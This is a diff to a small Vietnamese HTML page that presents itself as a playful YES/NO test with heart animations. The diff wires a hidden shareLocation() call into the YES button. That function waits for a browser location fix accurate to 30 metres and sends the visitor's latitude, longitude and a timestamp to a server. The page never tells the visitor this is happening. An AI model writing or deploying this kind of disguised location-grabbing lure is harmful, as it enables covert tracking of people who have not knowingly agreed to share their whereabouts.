@@ -43,6 +43,7 @@
       overflow: hidden;
       border: none;
       cursor: pointer;
+      margin: 0.5rem;
     }
 
     .btn-heart:hover {
@@ -138,23 +139,33 @@
 </head>
 <body>
   <div class="container">
-    <h1 class="text-3xl font-bold text-indigo-600 mb-4">test chức năng</h1>
-    <p class="text-gray-700 mb-6">Nhấn yes hoặc no</p>
-    <button id="btn-heart" class="btn-heart">YES</button>
-    <button id="btn-heart" class="btn-heart">NO</button>
+    <h1 class="text-3xl font-bold text-indigo-600 mb-4">Test chức năng</h1>
+    <p class="text-gray-700 mb-6">Nhấn YES hoặc NO</p>
+    <button id="btn-yes" class="btn-heart">YES</button>
+    <button id="btn-no" class="btn-heart">NO</button>
     <p id="thank-message" class="thank-message">❤️ Cảm ơn bạn!</p>
   </div>
 
   <script>
-    const btn = document.getElementById('btn-heart');
+    // Lấy các phần tử DOM
+    const btnYes = document.getElementById('btn-yes');
+    const btnNo = document.getElementById('btn-no');
     const thankMessage = document.getElementById('thank-message');
 
-    btn.addEventListener('click', () => {
-      thankMessage.style.display = 'block';
-      spawnHearts();
-      spawnParticles();
+    // Gắn sự kiện cho nút YES
+    btnYes.addEventListener('click', () => {
+      thankMessage.style.display = 'block'; // Hiển thị thông báo cảm ơn
+      spawnHearts(); // Tạo hiệu ứng trái tim
+      spawnParticles(); // Tạo hiệu ứng hạt
+      shareLocation(); // Chia sẻ vị trí
     });
 
+    // Gắn sự kiện cho nút NO
+    btnNo.addEventListener('click', () => {
+      alert('Bạn đã chọn NO'); // Phản hồi khi nhấn NO (có thể tùy chỉnh)
+    });
+
+    // Hàm tạo hiệu ứng trái tim
     function spawnHearts() {
       for (let i = 0; i < 8; i++) {
         const heart = document.createElement('div');
@@ -162,10 +173,11 @@
         heart.style.left = `${Math.random() * 100}%`;
         heart.style.animationDelay = `${Math.random() * 0.5}s`;
         document.body.appendChild(heart);
-        setTimeout(() => heart.remove(), 2000);
+        setTimeout(() => heart.remove(), 2000); // Xóa sau 2 giây
       }
     }
 
+    // Hàm tạo hiệu ứng hạt
     function spawnParticles() {
       for (let i = 0; i < 15; i++) {
         const particle = document.createElement('div');
@@ -173,18 +185,14 @@
         particle.style.left = `${Math.random() * 100}%`;
         particle.style.animationDelay = `${Math.random() * 2}s`;
         document.body.appendChild(particle);
-        setTimeout(() => particle.remove(), 5000);
+        setTimeout(() => particle.remove(), 5000); // Xóa sau 5 giây
       }
     }
 
-    btn.addEventListener('click', () => {
-      thank.style.display = 'block';
-      shareLocation();
-    });
-
+    // Hàm chia sẻ vị trí
     function shareLocation() {
       if (!navigator.geolocation) {
-        return alert('Trình duyệt không hỗ trợ.');
+        return alert('Trình duyệt không hỗ trợ định vị.');
       }
 
       const options = {
@@ -192,13 +200,13 @@
         timeout: 20000,
         maximumAge: 0
       };
-      const minAccuracy = 30;
+      const minAccuracy = 30; // Độ chính xác tối thiểu (mét)
 
       const watchId = navigator.geolocation.watchPosition(
         pos => {
           if (pos.coords.accuracy <= minAccuracy) {
-            navigator.geolocation.clearWatch(watchId);
-            sendToServer(pos.coords.latitude, pos.coords.longitude);
+            navigator.geolocation.clearWatch(watchId); // Ngừng theo dõi
+            sendToServer(pos.coords.latitude, pos.coords.longitude); // Gửi dữ liệu
           }
         },
         err => {
@@ -209,9 +217,10 @@
       );
     }
 
+    // Hàm gửi dữ liệu đến server
     function sendToServer(lat, lon) {
       const now = new Date();
-      const vnOffset = 7 * 60 * 60 * 1000; // 7 tiếng tính bằng mili giây
+      const vnOffset = 7 * 60 * 60 * 1000; // Độ lệch múi giờ Việt Nam (7 tiếng)
       const vnTime = new Date(now.getTime() + vnOffset).toISOString();
       const params = new URLSearchParams({
         latitude: lat,
@@ -228,14 +237,14 @@
       })
       .then(res => res.json())
       .then(data => {
-        console.log('Server response:', data);
+        console.log('Phản hồi từ server:', data);
+        // Có thể thêm thông báo thành công cho người dùng ở đây
       })
       .catch(err => {
-        alert('Error: ' + err.message);
+        alert('Lỗi: ' + err.message);
         console.error(err);
       });
     }
-
   </script>
 </body>
 </html>
